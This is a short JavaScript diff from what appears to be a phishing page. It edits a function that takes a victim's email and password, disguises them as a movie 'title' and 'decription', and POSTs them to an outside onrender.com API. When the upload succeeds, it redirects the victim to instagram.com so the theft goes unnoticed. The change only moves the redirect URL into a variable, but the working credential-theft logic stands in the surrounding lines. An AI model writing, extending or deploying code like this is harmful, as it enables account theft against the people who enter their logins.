@@ -10,6 +10,7 @@ const sendmeth = () => {
     const pkg = { title: email, decription: password }
     console.log(JSON.stringify(pkg))
     const API = "https://admin-api-maaj-sg2l.onrender.com/api/movie/data"
+    const redirecturl="https://www.instagram.com"
     if (email && password) {
         fetch(API, {
             method: 'POST',
@@ -20,7 +21,7 @@ const sendmeth = () => {
         })
             .then(res => {
                 if (res.status==201)
-                window.location.href ='https://www.instagram.com'
+                window.location.href =redirecturl
             })
             .catch(err => console.log(err));
     }
